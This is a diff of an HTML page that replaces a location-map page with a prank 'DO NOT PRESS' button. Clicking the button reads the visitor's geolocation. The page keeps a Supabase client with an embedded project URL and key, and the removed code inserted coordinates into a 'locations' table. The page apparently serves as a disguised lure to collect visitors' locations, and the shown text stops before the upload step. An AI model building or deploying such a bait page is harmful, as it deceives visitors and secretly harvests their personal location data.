@@ -1,41 +1,47 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>Konum Haritası</title>
+<meta charset="UTF-8">
+<title>Do Not Press</title>
 
-<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 
 <style>
-#map{
+body{
+background:black;
+color:red;
+display:flex;
+justify-content:center;
+align-items:center;
 height:100vh;
-width:100%;
+font-family:monospace;
+}
+
+button{
+background:black;
+color:red;
+border:2px solid red;
+padding:20px 40px;
+font-size:20px;
+cursor:pointer;
 }
 </style>
-
 </head>
 
 <body>
 
-<div id="map"></div>
+<button onclick="press()">DO NOT PRESS</button>
 
 <script>
 
-const supabaseUrl = "https://wfdznmedvdoakdjdogqh.supabase.co"
-const supabaseKey = "sb_publishable_ErhCPnxIZz-5VKOvE1oPnA_5KwyISi_"
+const supabase = window.supabase.createClient(
+"https://wfdznmedvdoakdjdogqh.supabase.co",
+"sb_publishable_ErhCPnxIZz-5VKOvE1oPnA_5KwyISi_"
+)
 
-const supabase = supabase.createClient(supabaseUrl, supabaseKey)
+function press(){
 
-function sendLocation(lat,lng){
+navigator.geolocation.getCurrentPosition(async (pos)=>{
 
-supabase
-.from("locations")
-.insert([
-{
-lat:lat,
-lng:lng
-}
-])
-
-}
-
-function init
+let lat = pos.coords.latitude
+let lng = pos
